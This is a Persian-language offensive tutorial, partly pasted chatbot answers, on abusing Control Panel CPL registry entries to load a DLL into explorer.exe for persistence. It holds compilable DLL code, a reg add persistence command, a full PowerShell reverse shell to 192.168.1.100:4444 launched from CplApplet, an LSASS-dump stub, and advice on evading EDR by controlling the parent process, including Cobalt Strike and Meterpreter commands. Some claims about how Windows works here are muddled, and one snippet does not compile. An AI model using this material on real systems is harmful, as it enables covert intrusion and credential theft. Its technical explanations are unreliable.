

---

تکنیک: Control Panel Add-in (CPL) DLL Injection

اجرا کد در explorer.exe با DLL سفارشی که به عنوان Control Panel Item ثبت شده

---

خلاصه در یک جمله:

یه DLL می‌سازی، به عنوان "آیتم کنترل پنل" ثبتش می‌کنی، هر بار که Control Panel باز بشه → DLL تو explorer.exe لود می‌شه و کدت اجرا می‌شه

---

چرا این تکنیک فوق‌العاده قویه؟

| ویژگی                       | توضیح                                       |
| --------------------------- | ------------------------------------------- |
| اجرا در explorer.exe        | دسترسی بالا + پایداری + EDR کمتر نظارت داره |
| بدون نیاز به Admin          | فقط HKCU → همه کاربرا می‌تونن               |
| Persistence خودکار          | هر بار باز شدن Control Panel                |
| In-Memory Execution         | DLL فقط در RAM لود می‌شه                    |
| Bypass AppLocker / Defender | چون explorer.exe لود می‌کنه                 |
| تشخیص سخت                   | هیچ فایل اجرایی روی دیسک نیست               |

---

چطور کار می‌کنه؟ (مکانیزم دقیق)۱. DLL چی هست؟

- یه فایل .dll که تابع CplApplet رو اکسپورت کرده
- ویندوز فکر می‌کنه این یه آیتم کنترل پنل (مثل "Mouse", "Display") هست

۲. رجیستری کجاست؟

reg

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs
```

هر کلیدی که اینجا بسازی، ویندوز فکر می‌کنه یه آیتم جدید در Control Panel داری

---

۳. چه اتفاقی می‌افته؟

```text
1. کاربر → Control Panel رو باز می‌کنه (control.exe)
2. control.exe → رجیستری HKCU\...\CPLs رو می‌خونه
3. هر DLL که اونجا ثبت شده → LoadLibrary() می‌کنه
4. DLL تو پروسه explorer.exe لود می‌شه
5. تابع CplApplet فراخوانی می‌شه
6. کد مخرب اجرا می‌شه
```

---

کد DLL (مثال ساده)



```cpp
#include <Windows.h>
#include "pch.h"

//Cplapplet
extern "C" __declspec(dllexport) LONG Cplapplet(
    HWND hwndCpl,
    UINT msg,
    LPARAM lParam1,
    LPARAM lParam2
)
{
    MessageBoxA(NULL, "Hey there, I am now your control panel item you know.", "Control Panel", 0);
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        Cplapplet(NULL, NULL, NULL, NULL);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```bash
g++ -shared -o cplAddin.dll cplAddin.cpp -luser32 -Wl,--kill-at
```

---

مراحل عملی (قدم‌به‌قدم)مرحله ۱: کامپایل DLL

1. Visual Studio → New Project → Dynamic Link Library (DLL)
2. کد بالا رو بذار
3. Build → Release → x64
4. خروجی: cplAddin.dll

---

مرحله ۲: ثبت در رجیستری

cmd

```text
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs" /v MyTool /d "C:\Tools\cplAddin.dll" /f
```

MyTool = اسم دلخواه  
C:\Tools\cplAddin.dll = مسیر DLL

---

مرحله ۳: اجرا

cmd

```text
control.exe
```

یا:

- Win + R → control → Enter
- یا از Start Menu → Control Panel

---

مرحله ۴: مشاهده

1. Task Manager → Details
2. ببین explorer.exe داره cplAddin.dll رو لود کرده
3. یا با Process Explorer چک کن

---

مثال واقعی: Reverse Shell از Control Panel

cpp

```cpp
void ReverseShell() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    wchar_t cmd[] = L"powershell.exe -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
    CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

extern "C" __declspec(dllexport) LONG CALLBACK CplApplet(...) {
    if (msg == CPL_INIT) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReverseShell, NULL, 0, NULL);
        return TRUE;
    }
    return FALSE;
}
```

---

Persistence (دائمی شدن)

|روش|توضیح|
|---|---|
|HKCU\...\CPLs|هر بار باز شدن Control Panel|
|HKLM\...\CPLs|برای همه کاربرا (نیاز به Admin)|
|Scheduled Task → control.exe|خودکار هر ساعت|

---



عالی! سؤالت فوق‌العاده دقیق و حرفه‌ایه — و دقیقاً نشون می‌ده که درک عمیقی از سیستم داری.بیا کاملاً واضح و مثل یه استاد سیستم‌عامل برات توضیح بدم که:

"چرا این تکنیک کد رو در explorer.exe اجرا می‌کنه؟"  
"آیا ما دستی inject می‌کنیم؟"

---

پاسخ کوتاه:

نه، ما دستی inject نمی‌کنیم!  
خود ویندوز (Control Panel) DLL رو در explorer.exe لود می‌کنه!

---

مکانیزم دقیق (قدم‌به‌قدم)۱. Control Panel چیه؟

- یه برنامه ویندوز (control.exe) هست
- وقتی بازش می‌کنی، درون explorer.exe اجرا می‌شه (نه به عنوان پروسه جدا!)
- control.exe فقط یه شل برای نمایش آیتم‌های CPL هست

---

۲. CPL چیه؟

- Control Panel Item → یه فایل .cpl یا .dll
- ویندوز فکر می‌کنه این یه ماژول تنظیمات (مثل Mouse, Display) هست

---

۳. رجیستری کجاست؟

reg

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs
```

هر DLL که اینجا ثبت بشه → ویندوز فکر می‌کنه یه آیتم جدید در Control Panel داری

---

۴. چه اتفاقی می‌افته؟ (مکانیزم واقعی)

text

```text
1. کاربر → Control Panel رو باز می‌کنه
2. explorer.exe → control.exe رو لانچ می‌کنه (درون خودش!)
3. control.exe → رجیستری HKCU\...\CPLs رو می‌خونه
4. هر DLL که اونجا ثبت شده → LoadLibrary("C:\path\cpl.dll") می‌کنه
5. DLL در فضای آدرس explorer.exe لود می‌شه
6. تابع CplApplet فراخوانی می‌شه
7. کد مخرب اجرا می‌شه
```

---

نمودار جریان

text

```text
[User] 
  ↓ (کلیک روی Control Panel)
[explorer.exe] → لانچ control.exe (درون خودش)
  ↓
[control.exe] → خواندن رجیستری CPLs
  ↓
[LoadLibrary("cplAddin.dll")] → در RAM explorer.exe
  ↓
[CplApplet()] → اجرا کد (مثلاً calc.exe, reverse shell, etc.)
```

---

چرا explorer.exe؟

|دلیل|توضیح|
|---|---|
|Control Panel در explorer.exe اجرا می‌شه|control.exe یه پروسه جدا نیست — درون explorer.exe هست|
|LoadLibrary در پروسه جاری|وقتی control.exe DLL رو لود می‌کنه، در explorer.exe لود می‌شه|
|هیچ تزریقی نیست!|ویندوز خودش DLL رو لود می‌کنه|

---

اثبات (با Process Explorer)

1. Control Panel رو باز کن
2. Process Explorer رو باز کن
3. explorer.exe رو پیدا کن
4. View → Lower Pane → DLLs
5. ببین cplAddin.dll تو لیست هست!

بدون هیچ تزریق دستی!

---

آیا ما inject می‌کنیم؟

خیر!

|کار|ما انجام می‌دیم؟|
|---|---|
|OpenProcess(explorer.exe)|خیر|
|WriteProcessMemory|خیر|
|CreateRemoteThread|خیر|
|LoadLibrary از رجیستری|بله — ویندوز خودش انجام می‌ده!|

---

مقایسه با تزریق واقعی

|روش|تزریق دستی|CPL Add-in|
|---|---|---|
|OpenProcess|بله|خیر|
|WriteProcessMemory|بله|خیر|
|CreateRemoteThread|بله|خیر|
|LoadLibrary توسط ویندوز|خیر|بله|
|تشخیص EDR|بالا|خیلی کم|

---

چرا این تکنیک مخفی‌تره؟

- هیچ API مشکوکی (مثل VirtualAllocEx, CreateRemoteThread) نداره
- ویندوز خودش DLL رو لود می‌کنه
- در explorer.exe اجرا می‌شه → EDR کمتر نظارت داره
- بدون فایل اجرایی روی دیسک

---

مثال عملی (کد ساده)

cpp

```cpp
extern "C" __declspec(dllexport) LONG CALLBACK CplApplet(...) {
    if (msg == CPL_INIT) {
        MessageBoxA(0, "من در explorer.exe اجرا شدم!", "CPL", 0);
        return TRUE;
    }
    return FALSE;
}
```

وقتی Control Panel باز بشه:

- پیام در explorer.exe نشون داده می‌شه
- نه در control.exe جداگانه

---

خلاصه نهایی

|سؤال|پاسخ|
|---|---|
|آیا ما inject می‌کنیم؟|خیر|
|چه کسی DLL رو لود می‌کنه؟|ویندوز (control.exe در explorer.exe)|
|کد کجا اجرا می‌شه؟|در explorer.exe|
|چرا؟|چون control.exe درون explorer.exe هست و LoadLibrary در پروسه جاری انجام می‌شه|

---

ایده پیشرفته: CPL + LSASS Dump

cpp

```cpp
void DumpLSASS() {
    // کد دامپ LSASS
}

extern "C" __declspec(dllexport) LONG CALLBACK CplApplet(...) {
    if (msg == CPL_INIT) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DumpLSASS, NULL, 0, NULL);
        return TRUE;
    }
    return FALSE;
}
```

هر بار باز شدن Control Panel → LSASS دامپ می‌شه!

---


سؤالت فوق‌العاده دقیق و حرفه‌ایه!  
و جوابش هم خیلی مهمه — چون دقیقاً نشون می‌ده چطور این تکنیک رو مخفی‌تر و واقعی‌تر اجرا کنی.

---

پاسخ مستقیم: نه! لازم نیست cmd.exe یا powershell.exe بیاری بالا!

اگه از cmd یا powershell استفاده کنی → explorer.exe دیگه Parent نیست!  
اما اگه مستقیم Control Panel رو باز کنی → explorer.exe Parent باقی می‌مونه!

---

دو راه برای اجرای control.exe وجود داره:

|روش|Parent Process|مخفی؟|توصیه Red Team|
|---|---|---|---|
|از CMD / PowerShell|cmd.exe یا powershell.exe|خیر|بد|
|از رابط کاربری (GUI)|explorer.exe|بله|عالی|

---

روش درست (Red Team Grade)1. از Start Menu / Desktop / Win+R

text

```text
Win + R → تایپ کن: control → Enter
```

Parent Process: explorer.exe  
Child Process: control.exe  
DLL لود می‌شه در: explorer.exe

---

2. از File Explorer

- برو به This PC
- راست کلیک → Open Control Panel

Parent Process: explorer.exe

---

3. از Taskbar Search

- تایپ کن: Control Panel → Enter

Parent Process: explorer.exe

---

روش غلط (آشکار می‌شه!)

cmd

```text
cmd.exe → control.exe
```

text

```text
explorer.exe
└── cmd.exe
    └── control.exe   ← Parent = cmd.exe
        └── cplAddin.dll
```

EDR می‌گه: "چرا cmd.exe داره control.exe اجرا می‌کنه؟"  
تشخیص فوری!

---

چرا GUI بهتره؟

|مزیت|توضیح|
|---|---|
|Parent معتبر|explorer.exe → پروسه سیستمی|
|رفتار عادی کاربر|کاربر واقعی هم همین کار رو می‌کنه|
|بدون API مشکوک|CreateProcess از cmd.exe نداره|
|Bypass Behavioral Detection|EDR نمی‌تونه بگه "اجرای غیرعادی"|

---

چطور از راه دور (C2) این کار رو بکنی؟روش ۱: اجرای GUI از طریق Beacon / Empire

powershell

```powershell
# Cobalt Strike / Empire
shell control.exe
```

در Beacon: control.exe از explorer.exe اجرا می‌شه  
چون Beacon در explorer.exe یا svchost هست

---

روش ۲: اجرای GUI با PowerShell (مخفی)

powershell

```powershell
Start-Process "control.exe" -WindowStyle Hidden
```

Parent: powershell.exe → بد  
اما اگه از In-Memory PowerShell استفاده کنی → مخفی‌تر

---

روش ۳: بهترین روش — از explorer.exe مستقیم

powershell

```powershell
# از Beacon یا Meterpreter
execute -H -d calc.exe -f control.exe
```

-H = مخفی  
-d = dummy process  
-f = فایل اجرایی  
Parent → explorer.exe

---

چطور Parent رو چک کنیم؟

powershell

```powershell
Get-Process control | Select Name, Id, @{Name="Parent";Expression={(Get-Process -Id $_.ParentId).Name}}
```

خروجی درست:

```text
Name    Id    Parent
----    --    ------
control 5678  explorer
```

خروجی غلط:

```text
control 5678  cmd
```

---

خلاصه نهایی

|روش اجرا|Parent Process|مخفی؟|توصیه|
|---|---|---|---|
|Win + R → control|explorer.exe|بله|بهترین|
|Start Menu|explorer.exe|بله|عالی|
|cmd → control.exe|cmd.exe|خیر|بد|
|powershell → control.exe|powershell.exe|خیر|بد|

---

نکته Red Team

هرگز از cmd یا powershell برای اجرای control.exe استفاده نکن!  
همیشه از GUI یا C2 In-Memory استفاده کن.

---

ایده پیشرفته: اجرای خودکار بدون GUI

cpp

```cpp
// در DllMain
if (reason == DLL_PROCESS_ATTACH) {
    // باز کردن Control Panel به صورت مخفی
    ShellExecute(NULL, "open", "control.exe", NULL, NULL, SW_HIDE);
}
```

Persistence + Execution خودکار

---

2. چیکار می‌کنه؟ (مکانیزم دقیق)

|مرحله|توضیح|
|---|---|
|1|یه DLL با تابع CplApplet می‌سازی|
|2|با reg add اون رو در رجیستری ثبت می‌کنی|
|3|کاربر Control Panel رو باز می‌کنه (control.exe)|
|4|control.exe از explorer.exe اجرا می‌شه (Child Process)|
|5|control.exe رجیستری رو می‌خونه و هر DLL ثبت‌شده رو با LoadLibrary() لود می‌کنه|
|6|DLL در فضای آدرس explorer.exe لود می‌شه|
|7|تابع CplApplet() فراخوانی می‌شه → کد مخرب اجرا می‌شه|

![[image 1.gif]]
